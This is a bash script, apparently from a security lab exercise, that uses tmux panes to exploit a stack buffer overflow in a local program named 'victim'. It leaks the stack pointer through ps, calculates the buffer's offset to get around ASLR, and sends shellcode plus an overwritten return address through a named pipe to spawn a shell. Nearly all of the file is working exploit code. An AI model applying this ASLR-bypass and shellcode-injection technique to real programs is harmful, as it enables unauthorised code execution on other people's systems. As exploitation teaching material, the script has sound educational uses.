#!/bin/bash
SESSION=$USER
tmux -2 new-session -d -s $SESSION
# Setup a window for tailing log files
tmux new-window -t $SESSION:1 -n 'Exploit'
tmux split-window -h
tmux select-pane -t 0
tmux send-keys "echo batman | setarch $(uname -m) -R ./victim > output0" C-m
tmux send-keys "setarch $(uname -m) -R ./victim" C-m
tmux select-pane -t 1
sleep 1 #waiting for victim to start up
tmux send-keys "ps -o cmd,esp -C victim > output1" C-m

sleep 1

namebuff=`sed -n 1p < output0`
stackptr=`grep victim output1 | rev | cut -d' ' -f1 | rev | awk '{print "0x7fff" $0}'`

#Armed with theknowledge we need to defeat ASLR
offset=$(($namebuff-$stackptr))

tmux select-pane -t 0
tmux send-keys C-c
tmux send-keys "./victim" C-m
tmux select-pane -t 1
sleep 1
tmux send-keys "ps -o cmd,esp -C victim > output1" C-m
sleep 1
stackptr=`grep victim output1 | rev | cut -d' ' -f1 | rev | awk '{print "0x7fff" $0}'`

printf "With ASLR enabled, for this run, buffer is located at %x\n" $(($stackptr+$offset))

#let's demonstrate it with pipes
tmux select-pane -t 0
tmux send-keys C-c
tmux send-keys "mkfifo pip" C-m
tmux send-keys "cat pip | ./victim" C-m
tmux select-pane -t 1
sleep 1
sp=`ps --no-header -C victim -o esp`
a=`printf %016x $((0x7fff$sp+$offset)) | tac -r -s..`

#does not work every time. But when it does, it's sweet
( ( cat shellcode ; printf %080d 0 ; echo $a ) | xxd -r -p ; cat ) > pip

rm output0 output1 pip
tmux kill-session -t $SESSION

